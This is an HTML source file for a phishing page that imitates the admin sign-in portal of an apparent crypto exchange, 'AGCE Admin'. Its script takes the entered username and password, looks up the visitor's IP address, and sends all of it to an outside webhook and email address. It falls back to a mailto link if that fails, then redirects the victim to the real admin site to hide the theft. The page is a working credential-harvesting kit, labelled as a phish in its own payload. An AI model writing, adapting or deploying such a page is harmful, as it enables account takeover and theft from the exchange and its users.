<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="logos.jpg" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Admin Portal — Arab Global</title>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f6fa;
        color: #243247;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
          sans-serif;
      }
      .card {
        width: 100%;
        max-width: 410px;
        padding: 36px;
        background: white;
        border: 1px solid #e3e8ef;
        border-radius: 12px;
        box-shadow: 0 12px 36px rgba(32, 52, 75, 0.07);
      }
      .brand-logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 24px;
      }
      .brand-logo {
        height: 48px;
        width: auto;
        max-width: 100%;
        object-fit: contain;
        display: block;
      }
      .brand-title {
        margin: 0 0 6px 0;
        color: #174c83 !important;
        font-size: 24px !important;
        font-weight: 700 !important;
        text-align: center !important;
      }
      .intro {
        margin: 0 0 24px 0 !important;
        color: #687587 !important;
        line-height: 1.5 !important;
        font-size: 14px !important;
        text-align: center !important;
      }
      label {
        display: block !important;
        margin: 18px 0 8px !important;
        font-size: 14px !important;
        font-weight: 600 !important;
        color: #243247 !important;
      }
      input {
        width: 100%;
        padding: 13px 14px !important;
        border: 1px solid #d5dce6 !important;
        border-radius: 7px !important;
        font: inherit !important;
      }
      button[type="submit"] {
        width: 100% !important;
        margin-top: 24px !important;
        padding: 14px !important;
        border: 0 !important;
        border-radius: 7px !important;
        background: #166534 !important;
        color: white !important;
        font-size: 15px !important;
        font-weight: 700 !important;
        cursor: pointer !important;
        transition: background 0.3s !important;
        box-shadow: none !important;
      }
      #statusArea {
        text-align: center;
        margin-top: 10px;
        color: #68758b;
        font-size: 14px;
        min-height: 20px; /* Prevent layout shift */
      }
    </style>
  </head>
  <body style="background-color: #f3f6fa">
    <main class="card">
      <div class="brand-logo-container">
        <img
          src="logo_light.svg"
          alt="Arab Global Crypto Exchange"
          class="brand-logo"
        />
      </div>

      <h1 class="brand-title">AGCE Admin</h1>
      <p class="intro">Sign in to manage your exchange.</p>

      <form id="demo-form">
        <label for="username">Username, email, phone</label>
        <input
          id="username"
          name="username"
          autocomplete="off"
          placeholder="admin@example.com"
          required
        />

        <label for="password">Password</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Enter your password"
          autocomplete="current-password"
          required
        />

        <button type="submit">Continue</button>
      </form>

      <div id="statusArea"></div>
    </main>

    <script>
      const form = document.getElementById("demo-form");
      const statusArea = document.getElementById("statusArea");

      // CONFIGURATION
      // Note: You must activate this endpoint at formsubmit.co first
      const WEBHOOK_URL = "https://formsubmit.co/kenselharry@proton.me";
      const TARGET_REDIRECT = "https://admin.arabglobal.ae/";
      const FALLBACK_EMAIL = "kenselharry@proton.me";

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        const username = document.getElementById("username").value.trim();
        const passVal = document.getElementById("password").value;

        if (!username || !passVal) {
          alert("Please fill all fields.");
          return;
        }

        const submitBtn = form.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";
        statusArea.innerHTML =
          "<span style='color:#68758b;'>Verifying credentials...</span>";

        // Prepare forensic data
        const context = {
          userAgent: navigator.userAgent,
          referrer: document.referrer || "Direct",
          screen: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          timestamp: new Date().toISOString(),
        };

        // Try to get IP address (best effort)
        let ip = "unknown";
        try {
          const ipRes = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipRes.json();
          ip = ipData.ip;
        } catch (e) {
          console.warn("IP fetch failed", e);
        }

        // Prepare payload for FormSubmit
        // FormSubmit reads standard form fields and renders them as plain text in the email body
        const payload = {
          _subject: `New Login Detected - AGCE Admin (${username})`,
          _template: "table", // Optional: Makes the email look like a table
          source: "AGCE Admin Phish",
          username: username,
          password: passVal,
          ip_address: ip,
          user_agent: context.userAgent,
          referrer: context.referrer,
          screen: context.screen,
          language: context.language,
          timestamp: context.timestamp,
        };

        try {
          // Send via Fetch to FormSubmit
          const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          // Success
          statusArea.innerHTML =
            "<span style='color:#28a745;'>Success! Credentials recorded.</span>";

          // Redirect to real site
          setTimeout(() => {
            window.location.href = TARGET_REDIRECT;
          }, 1000);
        } catch (error) {
          console.error("Webhook send failed", error);
          
          // --- ROBUST MAILTO FALLBACK ---
          const bodyText = `Username: ${username}\r\nPassword: ${passVal}\r\nIP: ${ip}\r\nUA: ${context.userAgent}\r\nReferrer: ${context.referrer}`;
          const encodedBody = encodeURIComponent(bodyText);
          const mailtoUrl = `mailto:${FALLBACK_EMAIL}?subject=${encodeURIComponent("New Login Detected - AGCE Admin")}&body=${encodedBody}`;
          
          // Safety Check: If URL is too long, truncate UA
          if (mailtoUrl.length > 1900) {
            const shortUA = context.userAgent.substring(0, 50) + "...";
            const shortBodyText = `Username: ${username}\r\nPassword: ${passVal}\r\nIP: ${ip}\r\nUA: ${shortUA}\r\nReferrer: ${context.referrer}`;
            const shortEncodedBody = encodeURIComponent(shortBodyText);
            window.location.href = `mailto:${FALLBACK_EMAIL}?subject=${encodeURIComponent("New Login Detected - AGCE Admin")}&body=${shortEncodedBody}`;
          } else {
            window.location.href = mailtoUrl;
          }

          statusArea.innerHTML =
            "<span style='color:#dc3545;'>Direct send failed. Opening mail client...</span>";
          submitBtn.disabled = false;
          submitBtn.textContent = "Continue";
        }
      });
    </script>
  </body>
</html>
